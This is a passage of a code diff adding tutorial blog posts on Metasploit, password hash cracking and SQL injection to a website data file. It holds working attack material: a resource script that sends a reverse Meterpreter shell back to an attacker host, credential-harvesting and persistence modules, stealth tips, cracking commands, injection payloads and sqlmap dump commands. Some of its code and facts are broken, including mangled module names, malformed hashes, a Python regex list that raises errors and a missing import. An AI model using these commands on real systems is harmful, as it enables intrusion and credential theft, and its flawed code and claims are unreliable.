+use exploit/windows/browser/ie_mshtml_coalesciener_
+
+# PDF exploit
+use exploit/windows/fileformat/adobe_pdf_embedded_exe
+
+# Office macro exploit
+use exploit/windows/fileformat/office_metasploit_enhanced_dde
+\`\`\`
+
+### Network Exploitation
+\`\`\`bash
+# SMB exploitation
+use exploit/windows/smb/smb_exec
+
+# RDP exploitation
+use exploit/windows/rdp/cve_2019_0708_bluekeep_rce
+
+# HTTP exploitation
+use exploit/windows/http/apache_mod_cgi_bash_env_exec
+\`\`\`
+
+## Database Integration
+
+### Workspace Management
+\`\`\`bash
+# Create workspace
+workspace -a "Client_A_Penetration_Test"
+
+# List workspaces
+workspace
+
+# Switch workspace
+workspace client_a
+
+# Delete workspace
+workspace -d old_test
+\`\`\`
+
+### Importing Scan Results
+\`\`\`bash
+# Import Nmap results
+db_import /path/to/nmap_scan.xml
+
+# Import Nexpose results
+db_import /path/to/nexpose_scan.xml
+
+# List hosts
+hosts
+
+# List services
+services
+
+# List vulnerabilities
+vulns
+\`\`\`
+
+### Using Database in Exploitation
+\`\`\`bash
+# Search in database
+services -p 80
+
+# Set RHOSTS from database
+hosts -S windows
+
+# Service-specific targeting
+services -p 445 -R
+\`\`\`
+
+## Automation and Scripting
+
+### Resource Scripts
+\`\`\`bash
+# Create resource script
+cat > exploit_resource.rc <<EOF
+use exploit/windows/smb/ms08_067_netapi
+set RHOSTS 192.168.1.100
+set PAYLOAD windows/meterpreter/reverse_tcp
+set LHOST 192.168.1.50
+set LPORT 4444
+exploit
+EOF
+
+# Execute resource script
+msfconsole -r exploit_resource.rc
+\`\`\`
+
+### PostgreSQL Database Setup
+\`\`\`bash
+# Initialize database
+msfdb init
+
+# Start database
+sudo systemctl start postgresql
+
+# Connect to database
+db_connect postgres:password@localhost:5432/msf
+\`\`\`
+
+### Custom Module Development
+\`\`\`ruby
+# Custom auxiliary module example
+require \'msf/core\'
+
+class MetasploitModule < Msf::Auxiliary
+  Rank = NormalRanking
+
+  def initialize(info = {})
+    super(update_info(info,
+      \'Name\'           => \'Custom Port Scanner\',
+      \'Description\'    => %q{
+        This module performs a simple TCP port scan
+      },
+      \'Author\'         => [\'Your Name\' ],
+      \'License\'        => MSF_LICENSE
+    ))
+
+    register_options(
+      [
+        OptString.new(\'TARGETHOST\', [true, \'Target host\', \'127.0.0.1\']),
+        OptPort.new(\'PORT\', [true, \'Target port\', 80])
+      ])
+  end
+
+  def run
+    target_host = datastore[\'TARGETHOST\']
+    target_port = datastore[\'PORT\']
+
+    begin
+      # Create TCP socket
+      sock = Rex::Socket::Tcp.create(
+        \'PeerHost\' => target_host,
+        \'PeerPort\' => target_port,
+        \'Timeout\'  => 10
+      )
+
+      print_status(\"Port #{target_port} is open on #{target_host}\")
+      sock.close
+    rescue Rex::ConnectionError
+      print_status(\"Port #{target_port} is closed on #{target_host}\")
+    end
+  end
+end
+\`\`\`
+
+## Professional Penetration Testing Workflow
+
+### Reconnaissance Phase
+\`\`\`bash
+# Use auxiliary modules for enumeration
+use auxiliary/scanner/portscan/tcp
+
+use auxiliary/scanner/http/title
+
+use auxiliary/scanner/smb/smb_version
+
+use auxiliary/scanner/ftp/ftp_version
+\`\`\`
+
+### Vulnerability Assessment
+\`\`\`bash
+# Vulnerability scanning modules
+use auxiliary/scanner/http/http_version
+
+use auxiliary/scanner/smb/smb_vuln_ms08_067
+
+use auxiliary/scanner/ssl/heartbleed
+\`\`\`
+
+### Exploitation Phase
+\`\`\`bash
+# Targeted exploitation
+use exploit/windows/smb/ms08_067_netapi
+
+use exploit/http/apache_mod_cgi_bash_env_exec
+
+use exploit/windows/rdp/cve_2019_0708_bluekeep_rce
+\`\`\`
+
+### Post-Exploitation Phase
+\`\`\`bash
+# System information gathering
+use post/windows/gather/checkvm
+
+use post/windows/gather/enum_system
+
+# Credential harvesting
+use post/windows/gather/credentials/sam
+
+# Persistence installation
+use post/windows/manage/persistence
+\`\`\`
+
+## Best Practices and Ethical Guidelines
+
+### Professional Standards
+1. **Always obtain written authorization**
+2. **Document all testing activities**
+3. **Respect system availability**
+4. **Report vulnerabilities responsibly**
+5. **Follow agreed-upon scope**
+
+### Technical Best Practices
+- Start with reconnaissance before exploitation
+- Use appropriate timing to avoid service disruption
+- Maintain detailed logs of all activities
+- Clean up after testing (remove backdoors, logs)
+- Use encryption for sensitive data transmission
+
+### Stealth Techniques
+- Use legitimate tools during legitimate assessments
+- Minimize system impact
+- Avoid leaving traces in logs
+- Use encrypted communication channels
+- Implement proper cleanup procedures
+
+## Troubleshooting Common Issues
+
+### Database Connection Problems
+\`\`\`bash
+# Check database status
+db_status
+
+# Restart database
+sudo systemctl restart postgresql
+
+# Reinitialize database
+msfdb reinit
+\`\`\`
+
+### Payload Generation Issues
+\`\`\`bash
+# Check available payloads
+show payloads
+
+# Test payload encoding
+msfvenom -l encoders
+
+# Verify payload generation
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f exe --help
+\`\`\`
+
+### Exploit Module Problems
+\`\`\`bash
+# Check module compatibility
+check
+
+# View module options
+show options
+
+# Check module requirements
+info exploit/windows/smb/ms08_067_netapi
+\`\`\`
+
+## Conclusion
+
+Metasploit Framework is an incredibly powerful tool that, when used ethically and professionally, provides comprehensive penetration testing capabilities. Master these fundamentals and continue learning advanced techniques to become an expert penetration tester.
+
+**Remember**: Use Metasploit responsibly and only for authorized security testing. The knowledge and tools should always be used to improve security, not compromise it.`,
+    category: 'Penetration Testing',
+    tags: ['Metasploit', 'Exploitation', 'Payloads', 'Penetration Testing'],
+    date: '2025-11-06',
+    readTime: '20 min read',
+    author: 'Exploitation Specialist'
+  },
+  {
+    id: '5',
+    slug: 'password-security-hash-cracking',
+    title: 'Password Security: Best Practices and Hash Cracking',
+    excerpt: 'Learn password security fundamentals, hashing algorithms, and ethical password cracking techniques for security assessments.',
+    content: `# Password Security: Best Practices and Hash Cracking
+
+Password security is fundamental to cybersecurity. Understanding password storage, hashing algorithms, and cracking techniques is essential for security professionals.
+
+## Password Security Fundamentals
+
+### Why Password Security Matters
+Passwords are the most common authentication method:
+- Billions of passwords compromised annually
+- Users reuse passwords across services
+- Weak passwords are easily guessable
+- Password attacks are automated and widespread
+
+### Password Attack Types
+1. **Brute Force**: Trying all possible combinations
+2. **Dictionary Attacks**: Using word lists and variations
+3. **Rainbow Tables**: Pre-computed hash databases
+4. **Social Engineering**: Tricking users into revealing passwords
+5. **Credential Stuffing**: Using leaked passwords from other breaches
+
+## Password Hashing Algorithms
+
+### Weak Hashing Algorithms
+
+#### MD5 (Cryptographically Broken)
+\`\`\`bash
+# MD5 hash generation
+echo -n "password123" | md5sum
+# Output: 482c811da5d5b4bc6d497ffa98491e38
+
+# MD5 collision demonstrated
+md5sum file1.txt
+md5sum file2.txt  # Different files, same hash possible
+\`\`\`
+
+**Problems:**
+- Fast computation (good for GPU attacks)
+- Vulnerable to collisions
+- No salt support in original design
+
+#### SHA-1 (Deprecated for Security)
+\`\`\`bash
+# SHA-1 hash generation
+echo -n "password123" | sha1sum
+# Output: 3c0ce44f411e05cdf6c5a2ce3f0e7ad7bb7e9e03
+\`\`\`
+
+**Problems:**
+- Still too fast for password hashing
+- Theoretical collisions practical in 2017
+- Deprecated by NIST
+
+### Modern Password Hashing
+
+#### bcrypt (Recommended)
+\`\`\`python
+import bcrypt
+
+# Hash password
+password = b"user_password"
+hashed = bcrypt.hashpw(password, bcrypt.gensalt())
+print(hashed.decode())
+
+# Verify password
+if bcrypt.checkpw(password, hashed):
+    print("Password correct")
+\`\`\`
+
+**Advantages:**
+- Built-in salt generation
+- Adjustable work factor (cost parameter)
+- Memory-hard function (resistant to ASIC/GPU)
+
+#### Argon2 (Winner of Password Hashing Competition)
+\`\`\`python
+from argon2 import PasswordHasher
+
+ph = PasswordHasher()
+hash = ph.hash("user_password")
+print(hash)
+
+# Verify
+try:
+    ph.verify(hash, "user_password")
+    print("Password correct")
+except:
+    print("Password incorrect")
+\`\`\`
+
+**Advantages:**
+- Winner of 2015 Password Hashing Competition
+- Memory-hard and parallelizable
+- Side-channel resistant
+
+#### scrypt (Memory-hard)
+\`\`\`python
+import scrypt
+
+# Derive key from password
+password = b"user_password"
+key = scrypt.hash(password, password, 1024, 8, 1)
+print(key.hex())
+
+# Verify
+if key == scrypt.hash(password, password, 1024, 8, 1):
+    print("Password correct")
+\`\`\`
+
+## Hash Cracking Techniques
+
+### Understanding Hash Formats
+
+#### Common Hash Formats
+\`\`\`bash
+# MD5 (no salt)
+d41d8cd98f00b204e9800998ecf8427e
+
+# SHA-1 (no salt)
+356a192b7913b04c54574d18c28d46e6395428ab
+
+# bcrypt ($2b$10$...)
+$2b$10$CwTycUXWue0Thq9StjUM0uJ8Z3D8CJ0tA9P8l3r9
+
+# NT/LM (Windows)
+LM: F0D412BD764FFE81AAD3B435B51404EE
+NT: 209C6174DA490CAEB422F3FA5A8AE31
+\`\`\`
+
+### Using Hashcat for Password Cracking
+
+#### Installation and Setup
+\`\`\`bash
+# Install Hashcat
+sudo apt install hashcat
+
+# Install GPU drivers (for faster cracking)
+sudo apt install nvidia-driver-470  # NVIDIA
+sudo apt install mesa-opencl-icd    # AMD/Intel
+\`\`\`
+
+#### Basic Hashcat Usage
+\`\`\`bash
+# List available modes
+hashcat --help | grep -A 100 "Hash-Mode"
+
+# Crack MD5 hash
+echo "5f4dcc3b5aa765d61d8327deb882cf99" | hashcat -m 0 -a 3 "?a?a?a?a?a?a?a?a"
+
+# Crack bcrypt hash (slower)
+echo "$2b$10$uO.cRj3fUJBud.7d7F3F.tJbZ7xD9dC7dT3O3R6S5B7F3D8E" | hashcat -m 3200 -a 3 ?a?a?a?a?a?a
+\`\`\`
+
+#### Dictionary Attacks
+\`\`\`bash
+# Use wordlist
+hashcat -m 0 -a 0 hashes.txt wordlist.txt
+
+# Use multiple wordlists
+hashcat -m 0 -a 0 hashes.txt wordlist1.txt wordlist2.txt
+
+# Use rules with wordlist
+hashcat -m 0 -a 0 hashes.txt wordlist.txt -r rules/best64.rule
+\`\`\`
+
+#### Rule-Based Attacks
+\`\`\`bash
+# Apply transformation rules
+hashcat -m 0 -a 0 hashes.txt wordlist.txt -r rules/best64.rule
+
+# Create custom rule
+cat custom.rule
+$1
+$2
+$3
+$!
+\'a
+
+# Use custom rule
+hashcat -m 0 -a 0 hashes.txt wordlist.txt -r custom.rule
+\`\`\`
+
+#### Mask Attacks
+\`\`\`bash
+# 8-digit numeric password
+hashcat -m 0 -a 3 hashes.txt ?d?d?d?d?d?d?d?d
+
+# Mixed alphanumeric (8 characters)
+hashcat -m 0 -a 3 hashes.txt ?a?a?a?a?a?a?a?a
+
+# Custom mask (2 uppercase, 2 lowercase, 2 digits, 1 symbol)
+hashcat -m 0 -a 3 hashes.txt ?u?u?l?l?d?d?s
+\`\`\`
+
+#### Hybrid Attacks
+\`\`\`bash
+# Wordlist + mask
+hashcat -m 0 -a 6 hashes.txt wordlist.txt ?d?d?d?d
+
+# Mask + wordlist
+hashcat -m 0 -a 7 hashes.txt ?d?d?d?d wordlist.txt
+\`\`\`
+
+### Using John the Ripper
+
+#### Installation and Basic Usage
+\`\`\`bash
+# Install John
+sudo apt install john
+
+# Check hash format
+john --list=formats
+
+# Basic crack
+john hashes.txt
+
+# Use wordlist
+john --wordlist=wordlist.txt hashes.txt
+
+# Use rules
+john --wordlist=wordlist.txt --rules=wordlist.rules hashes.txt
+\`\`\`
+
+#### Incremental Mode
+\`\`\`bash
+# Try all possible character combinations
+john --incremental:all hashes.txt
+
+# Numeric only
+john --incremental:digits hashes.txt
+\`\`\`
+
+#### Custom Rules
+\`\`\`bash
+# Create rule file
+cat custom_john.rules
+[Rules]
+[List.Rules:Wordlist]
+c $1 $2 $3 $!
+A0 #pA1 #pA2 #pA3 #pA4
+
+# Use custom rule
+john --wordlist=wordlist.txt --rules=custom_john.rules hashes.txt
+\`\`\`
+
+## Advanced Cracking Techniques
+
+### Hash Generation for Testing
+\`\`\`bash
+# Generate MD5 hash
+echo -n "password" | md5sum
+
+# Generate SHA-256 hash
+echo -n "password" | sha256sum
+
+# Generate bcrypt hash (requires Python)
+python3 -c "import bcrypt; print(bcrypt.hashpw(b'password', bcrypt.gensalt()).decode())"
+\`\`\`
+
+### Creating Custom Wordlists
+\`\`\`bash
+# Combine existing wordlists
+cat wordlist1.txt wordlist2.txt > combined.txt
+sort -u combined.txt > unique_wordlist.txt
+
+# Create keyboard pattern wordlist
+crunch 6 10 -t @@@@## -o keyboard_patterns.txt
+
+# Generate company-specific wordlist
+hashcat -a 3 --stdout -1 CompanyName ?l?l?l?l?d?d?d?
+\`\`\`
+
+### Targeting Specific Hash Types
+
+#### Windows Hashes
+\`\`\`bash
+# NT hash (MD4)
+hashcat -m 1000 -a 3 hashes.txt ?a?a?a?a?a?a?a?a
+
+# LM hash (deprecated but still found)
+hashcat -m 3000 -a 3 hashes.txt ?a?a?a?a?a?a?a?a
+\`\`\`
+
+#### Linux Shadow Passwords
+\`\`\`bash
+# SHA-512
+hashcat -m 1800 -a 0 hashes.txt wordlist.txt
+
+# bcrypt
+hashcat -m 3200 -a 0 hashes.txt wordlist.txt
+\`\`\`
+
+#### Web Application Hashes
+\`\`\`bash
+# WordPress
+hashcat -m 400 -a 0 hashes.txt wordlist.txt
+
+# phpBB3
+hashcat -m 400 -a 0 hashes.txt wordlist.txt
+
+# MySQL5
+hashcat -m 300 -a 0 hashes.txt wordlist.txt
+\`\`\`
+
+## Password Strength Analysis
+
+### Identifying Weak Passwords
+\`\`\`bash
+# Common weak patterns
+grep -E "^.{4,8}$" weak_passwords.txt  # Too short
+grep -E "^(123|abc|password|qwerty)" weak_passwords.txt  # Common patterns
+grep -E "(.)\\1{2,}" weak_passwords.txt  # Repeated characters
+\`\`\`
+
+### Entropy Calculation
+\`\`\`python
+import math
+import string
+
+def calculate_entropy(password):
+    charsets = {
+        'lowercase': string.ascii_lowercase,
+        'uppercase': string.ascii_uppercase,
+        'digits': string.digits,
+        'symbols': string.punctuation
+    }
+    
+    charset_size = 0
+    for charset_name, charset in charsets.items():
+        if any(c in password for c in charset):
+            charset_size += len(charset)
+    
+    entropy = math.log2(charset_size) * len(password)
+    return entropy
+
+# Examples
+print(f"Entropy of 'password': {calculate_entropy('password'):.2f} bits")
+print(f"Entropy of 'P@ssw0rd!': {calculate_entropy('P@ssw0rd!'):.2f} bits")
+print(f"Entropy of 'Xk9#mN2$pQ7': {calculate_entropy('Xk9#mN2$pQ7'):.2f} bits")
+\`\`\`
+
+## Building Security Programs
+
+### Python Password Cracker
+\`\`\`python
+#!/usr/bin/env python3
+import hashlib
+import itertools
+import string
+import time
+
+def simple_md5_cracker(hash_target, max_length=6):
+    """Simple MD5 password cracker"""
+    charset = string.ascii_lowercase + string.digits
+    
+    for length in range(1, max_length + 1):
+        print(f"Trying length {length}...")
+        start_time = time.time()
+        
+        for combo in itertools.product(charset, repeat=length):
+            password = ''.join(combo)
+            hash_result = hashlib.md5(password.encode()).hexdigest()
+            
+            if hash_result == hash_target:
+                elapsed = time.time() - start_time
+                print(f"Found: {password} in {elapsed:.2f} seconds")
+                return password
+        
+        elapsed = time.time() - start_time
+        print(f"Length {length} completed in {elapsed:.2f} seconds")
+    
+    print("Password not found")
+    return None
+
+# Example usage
+target_hash = "5f4dcc3b5aa765d61d8327deb882cf99"  # "password"
+result = simple_md5_cracker(target_hash, max_length=6)
+\`\`\`
+
+### Password Strength Checker
+\`\`\`python
+#!/usr/bin/env python3
+import re
+import requests
+import json
+
+def check_password_strength(password):
+    """Check password strength and breach status"""
+    
+    score = 0
+    feedback = []
+    
+    # Length check
+    if len(password) >= 12:
+        score += 2
+        feedback.append("Good length (12+ characters)")
+    elif len(password) >= 8:
+        score += 1
+        feedback.append("Adequate length (8+ characters)")
+    else:
+        feedback.append("Too short (minimum 8 characters)")
+    
+    # Character variety
+    if re.search(r'[a-z]', password):
+        score += 1
+    if re.search(r'[A-Z]', password):
+        score += 1
+    if re.search(r'[0-9]', password):
+        score += 1
+    if re.search(r'[^a-zA-Z0-9]', password):
+        score += 1
+    
+    # Common patterns
+    if re.search(r'(.)\\1{2,}', password):
+        score -= 1
+        feedback.append("Contains repeated characters")
+    
+    if re.search(r'(123|abc|password|qwerty)', password.lower()):
+        score -= 2
+        feedback.append("Contains common patterns")
+    
+    # Check against HaveIBeenPwned
+    breached = check_haveibeenpwned(password)
+    if breached:
+        score = 0
+        feedback.append("Password found in breach databases - UNSAFE")
+    
+    return score, feedback
+
+def check_haveibeenpwned(password):
+    """Check if password has been in breaches"""
+    try:
+        sha1_hash = hashlib.sha1(password.encode()).hexdigest().upper()
+        hash_prefix = sha1_hash[:5]
+        hash_suffix = sha1_hash[5:]
+        
+        response = requests.get(
+            f"https://api.pwnedpasswords.com/range/{hash_prefix}",
+            headers={"User-Agent": "PasswordChecker/1.0"}
+        )
+        
+        for line in response.text.splitlines():
+            hash_suffix_line, count = line.split(':')
+            if hash_suffix_line == hash_suffix:
+                return int(count)
+        
+        return 0
+    except Exception as e:
+        print(f"Error checking HIBP: {e}")
+        return 0
+
+# Example usage
+password = "MySecurePassword123!"
+score, feedback = check_password_strength(password)
+print(f"Password strength score: {score}/10")
+for tip in feedback:
+    print(f"- {tip}")
+\`\`\`
+
+## Best Practices for Security Professionals
+
+### Ethical Hash Cracking
+1. **Always obtain authorization** before cracking passwords
+2. **Use only for legitimate security testing**
+3. **Respect privacy and confidentiality**
+4. **Report findings responsibly**
+5. **Use secure methods for password storage**
+
+### Defensive Measures
+\`\`\`python
+# Secure password hashing example
+import bcrypt
+import secrets
+
+def create_user(username, password):
+    """Create user with properly hashed password"""
+    # Generate random salt
+    salt = bcrypt.gensalt()
+    
+    # Hash password with salt
+    hashed_password = bcrypt.hashpw(password.encode(), salt)
+    
+    # Store in database
+    store_user(username, hashed_password)
+    
+    return True
+
+def verify_password(stored_hash, provided_password):
+    """Verify password against stored hash"""
+    return bcrypt.checkpw(provided_password.encode(), stored_hash)
+\`\`\`
+
+### Password Policy Implementation
+\`\`\`python
+def validate_password_policy(password):
+    """Validate password against security policy"""
+    errors = []
+    
+    if len(password) < 12:
+        errors.append("Password must be at least 12 characters")
+    
+    if not re.search(r'[A-Z]', password):
+        errors.append("Password must contain uppercase letter")
+    
+    if not re.search(r'[a-z]', password):
+        errors.append("Password must contain lowercase letter")
+    
+    if not re.search(r'[0-9]', password):
+        errors.append("Password must contain digit")
+    
+    if not re.search(r'[^a-zA-Z0-9]', password):
+        errors.append("Password must contain special character")
+    
+    # Check against common password lists
+    if is_common_password(password):
+        errors.append("Password is too common")
+    
+    return len(errors) == 0, errors
+\`\`\`
+
+## Conclusion
+
+Password security is a critical component of cybersecurity. Understanding both offensive (cracking) and defensive (protection) techniques is essential for security professionals.
+
+**Key Takeaways:**
+- Always use modern hashing algorithms (bcrypt, Argon2)
+- Implement strong password policies
+- Use multi-factor authentication where possible
+- Regularly audit password security
+- Educate users about password best practices
+
+Remember: **Use this knowledge responsibly** to improve security, not to compromise systems.`,
+    category: 'Web Security',
+    tags: ['Password Security', 'Hashing', 'Hashcat', 'John the Ripper'],
+    date: '2025-11-04',
+    readTime: '16 min read',
+    author: 'Security Specialist'
+  },
+  {
+    id: '6',
+    slug: 'web-application-security-sql-injection',
+    title: 'Web Application Security: SQL Injection and Protection',
+    excerpt: 'Comprehensive guide to SQL injection vulnerabilities, detection techniques, and protection methods for web applications.',
+    content: `# Web Application Security: SQL Injection and Protection
+
+SQL injection remains one of the most dangerous web application vulnerabilities, affecting millions of applications worldwide. Understanding both attack and defense is crucial for web security professionals.
+
+## Understanding SQL Injection
+
+### What is SQL Injection?
+SQL injection occurs when attackers can insert malicious SQL code into application queries, potentially:
+- Bypassing authentication
+- Reading sensitive data
+- Modifying or deleting data
+- Executing administrative operations
+- Taking complete control of the database server
+
+### Vulnerable Code Examples
+
+#### Python (Vulnerable)
+\`\`\`python
+# VULNERABLE - Direct string concatenation
+username = request.form['username']
+password = request.form['password']
+
+query = f"SELECT * FROM users WHERE username='{username}' AND password='{password}'"
+cursor.execute(query)
+\`\`\`
+
+#### PHP (Vulnerable)
+\`\`\`php
+<?php
+// VULNERABLE - Direct concatenation
+$username = $_POST['username'];
+$password = $_POST['password'];
+
+$query = "SELECT * FROM users WHERE username='$username' AND password='$password'";
+$result = mysqli_query($connection, $query);
+?>
+\`\`\`
+
+#### Java (Vulnerable)
+\`\`\`java
+// VULNERABLE - String concatenation
+String username = request.getParameter("username");
+String password = request.getParameter("password");
+
+String query = "SELECT * FROM users WHERE username='" + username + "' AND password='" + password + "'";
+Statement stmt = connection.createStatement();
+ResultSet rs = stmt.executeQuery(query);
+\`\`\`
+
+## SQL Injection Attack Types
+
+### 1. Union-Based SQL Injection
+\`\`\`sql
+-- Original query
+SELECT id, name, email FROM users WHERE id = 1
+
+-- Union injection
+1' UNION SELECT password, username, email FROM admin_users --
+
+-- Result
+SELECT id, name, email FROM users WHERE id = 1' UNION SELECT password, username, email FROM admin_users --
+\`\`\`
+
+### 2. Boolean-Based Blind SQL Injection
+\`\`\`sql
+-- Test if admin exists
+' OR (SELECT COUNT(*) FROM users WHERE username='admin') > 0 --
+
+-- Extract data character by character
+' OR ASCII(SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)) > 64 --
+\`\`\`
+
+### 3. Time-Based Blind SQL Injection
+\`\`\`sql
+-- Use sleep() to infer data
+' OR (SELECT COUNT(*) FROM users WHERE username='admin' AND SLEEP(5)) > 0 --
+
+-- Time-based extraction
+' OR IF(ASCII(SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1))>64,SLEEP(5),0) --
+\`\`\`
+
+### 4. Error-Based SQL Injection
+\`\`\`sql
+-- Force database errors to reveal information
+' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT password FROM users WHERE username='admin'), 0x7e)) --
+
+-- Using extractvalue() to display data in error messages
+\`\`\`
+
+## Tools and Techniques for Testing
+
+### Manual Testing
+
+#### Test Payloads
+\`\`\`sql
+-- Basic test
+1' OR '1'='1
+
+-- Comment out rest of query
+1' OR '1'='1' -- 
+
+-- Different comment syntax
+1' OR '1'='1' /*
+
+-- Boolean-based test
+1' AND '1'='1
+
+-- Numeric injection
+1 OR 1=1
+\`\`\`
+
+#### Testing Parameters
+\`\`\`sql
+-- Test different parameters
+?id=1' -- (GET parameter)
+?id=1' OR '1'='1 -- (Union-based)
+?id=1' AND SLEEP(5) -- (Time-based)
+
+-- Test POST parameters
+username=admin'--
+password=anything
+
+-- Test HTTP headers
+Cookie: session_id=abc' UNION SELECT * FROM users--
+\`\`\`
+
+### Automated Tools
+
+#### SQLMap Installation and Usage
+\`\`\`bash
+# Install SQLMap
+git clone https://github.com/sqlmapproject/sqlmap.git
+cd sqlmap
+
+# Basic scan
+python3 sqlmap.py -u "http://target.com/login.php" --data="username=test&password=test"
+
+# Advanced scan
+python3 sqlmap.py -u "http://target.com/product.php?id=1" --batch --crawl=2
+
+# Use Tor for anonymity
+python3 sqlmap.py -u "http://target.com/product.php?id=1" --tor --check-tor
+
+# Specific database detection
+python3 sqlmap.py -u "http://target.com/product.php?id=1" --dbms=mysql --batch
+\`\`\`
+
+#### SQLMap Commands
+\`\`\`bash
+# GET parameter injection
+sqlmap -u "http://target.com/product.php?id=1" --batch
+
+# POST parameter injection
+sqlmap -u "http://target.com/login.php" --data="username=test&password=test" --batch
+
+# Cookie injection
+sqlmap -u "http://target.com/product.php?id=1" --cookie="session_id=abc123" --batch
+
+# Custom header injection
+sqlmap -u "http://target.com/product.php?id=1" --header="X-Forwarded-For: 127.0.0.1" --batch
+
+# Crawl website
+sqlmap -u "http://target.com/" --crawl=3 --batch
+
+# Enumerate database
+sqlmap -u "http://target.com/product.php?id=1" --dbs --batch
+
+# Dump specific database
+sqlmap -u "http://target.com/product.php?id=1" -D target_db --dump --batch
+\`\`\`
+
+#### Other Web Application Security Tools
+\`\`\`bash
+# Burp Suite (GUI)
+# Free community edition available
+# Professional features for SQL injection testing
+
+# OWASP ZAP (Free)
+zap-cli quick-scan http://target.com/
+
+# Nikto (Web server scanner)
+nikto -h http://target.com/
+
+# Nuclei (Template-based scanner)
+nuclei -u http://target.com/ -t sql-injection/
+\`\`\`
+
+## Defensive Programming
+
+### Parameterized Queries (Prepared Statements)
+
+#### Python
+\`\`\`python
+import sqlite3
+
+# SECURE - Using parameterized queries
+username = request.form['username']
+password = request.form['password']
+
+query = "SELECT * FROM users WHERE username=? AND password=?"
+cursor.execute(query, (username, password))
+
+# Using ORM (recommended)
+from sqlalchemy.orm import sessionmaker
+
+Session = sessionmaker(bind=engine)
+session = Session()
+
+user = session.query(User).filter_by(
+    username=username,
+    password=password_hash(password)
+).first()
+\`\`\`
+
+#### PHP
+\`\`\`php
+<?php
+// SECURE - Using prepared statements
+$username = $_POST['username'];
+$password = $_POST['password'];
+
+$stmt = $pdo->prepare("SELECT * FROM users WHERE username = ? AND password = ?");
+$stmt->execute([$username, $hashed_password]);
+$user = $stmt->fetch();
+
+// Using PDO (recommended)
+$stmt = $pdo->prepare("SELECT * FROM users WHERE username = :username AND password = :password");
+$stmt->execute([
+    'username' => $username,
+    'password' => $password_hash
+]);
+?>
+\`\`\`
+
+#### Java
+\`\`\`java
+// SECURE - Using PreparedStatement
+String username = request.getParameter("username");
+String password = request.getParameter("password");
+
+String query = "SELECT * FROM users WHERE username = ? AND password = ?";
+PreparedStatement stmt = connection.prepareStatement(query);
+stmt.setString(1, username);
+stmt.setString(2, password);
+
+ResultSet rs = stmt.executeQuery();
+
+// Using JPA (recommended)
+TypedQuery<User> query = em.createQuery(
+    "SELECT u FROM User u WHERE u.username = :username AND u.password = :password",
+    User.class
+);
+query.setParameter("username", username);
+query.setParameter("password", hashedPassword);
+\`\`\`
+
+#### Node.js
+\`\`\`javascript
+// SECURE - Using parameterized queries
+const username = req.body.username;
+const password = req.body.password;
+
+const query = 'SELECT * FROM users WHERE username = ? AND password = ?';
+db.execute(query, [username, password], (err, results) => {
+    if (err) throw err;
+    // Handle results
+});
+
+// Using ORM (recommended)
+const users = await User.findOne({
+    where: {
+        username: username,
+        password: passwordHash
+    }
+});
+\`\`\`
+
+### Input Validation and Sanitization
+
+#### Whitelist Validation
+\`\`\`python
+import re
+
+def validate_username(username):
+    """Whitelist validation for username"""
+    # Allow only alphanumeric characters, 3-20 characters
+    pattern = r'^[a-zA-Z0-9]{3,20}$'
+    
+    if re.match(pattern, username):
+        return True
+    return False
+
+def validate_email(email):
+    """Email validation"""
+    pattern = r'^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$'
+    
+    if re.match(pattern, email):
+        return True
+    return False
+
+# Usage
+if validate_username(request.form['username']):
+    # Process username
+    pass
+else:
+    # Return error
+    pass
+\`\`\`
+
+#### Content Security Policy
+\`\`\`html
+<meta http-equiv="Content-Security-Policy" content="
+    default-src 'self';
+    script-src 'self' 'unsafe-inline';
+    style-src 'self' 'unsafe-inline';
+    img-src 'self' data:;
+">
+\`\`\`
+
+#### HTTP Security Headers
+\`\`\`python
+from flask import Flask, make_response
+
+app = Flask(__name__)
+
+@app.after_request
+def add_security_headers(response):
+    # Prevent XSS
+    response.headers['X-Content-Type-Options'] = 'nosniff'
+    response.headers['X-Frame-Options'] = 'DENY'
+    response.headers['X-XSS-Protection'] = '1; mode=block'
+    
+    # Force HTTPS
+    response.headers['Strict-Transport-Security'] = 'max-age=31536000; includeSubDomains'
+    
+    # Content Security Policy
+    response.headers['Content-Security-Policy'] = "default-src 'self'"
+    
+    return response
+\`\`\`
+
+## Advanced Protection Techniques
+
+### Database Security Configuration
+
+#### Principle of Least Privilege
+\`\`\`sql
+-- Create application user with minimal permissions
+CREATE USER 'app_user'@'localhost' IDENTIFIED BY 'strong_password';
+
+-- Grant only necessary permissions
+GRANT SELECT, INSERT, UPDATE, DELETE ON app_db.* TO 'app_user'@'localhost';
+
+-- Deny dangerous operations
+REVOKE ALL PRIVILEGES ON *.* FROM 'app_user'@'localhost';
+
+-- Flush privileges
+FLUSH PRIVILEGES;
+\`\`\`
+
+#### Database Hardening
+\`\`\`sql
+-- Remove dangerous functions
+DELETE FROM mysql.func WHERE name IN ('load_file', 'into outfile', 'into dumpfile');
+
+-- Disable file system access
+SET GLOBAL local_infile = 'OFF';
+\`\`\`
+
+### Application Security Framework
+
+#### Python Flask Security
+\`\`\`python
+from flask import Flask, request, jsonify
+from werkzeug.security import generate_password_hash, check_password_hash
+import re
+import secrets
+
+app = Flask(__name__)
+
+class SecurityMiddleware:
+    @staticmethod
+    def validate_input(data):
+        """Input validation middleware"""
+        # Remove null bytes
+        cleaned_data = {k: v.replace('\x00', '') for k, v in data.items()}
+        
+        # Check for SQL injection patterns
+        sql_patterns = [
+            r'(',
+            r')',
+            r'--',
+            r';',
+            r'UNION',
+            r'SELECT',
+            r'INSERT',
+            r'UPDATE',
+            r'DELETE',
+            r'DROP',
+            r'ALTER'
+        ]
+        
+        for value in cleaned_data.values():
+            for pattern in sql_patterns:
+                if re.search(pattern, value, re.IGNORECASE):
+                    return False
+        
+        return True
+
+    @staticmethod
+    def generate_csrf_token():
+        """Generate CSRF protection token"""
+        return secrets.token_urlsafe(32)
+
+@app.route('/login', methods=['POST'])
+def login():
+    data = request.get_json()
+    
+    # Input validation
+    if not SecurityMiddleware.validate_input(data):
+        return jsonify({'error': 'Invalid input detected'}), 400
+    
+    # Rate limiting
+    if request.headers.get('X-Rate-Limit-Exceeded'):
+        return jsonify({'error': 'Too many requests'}), 429
+    
+    # Process login
+    # ... (rest of login logic)
+    
+    return jsonify({'success': True})
+\`\`\`
+
+## Testing and Validation
+
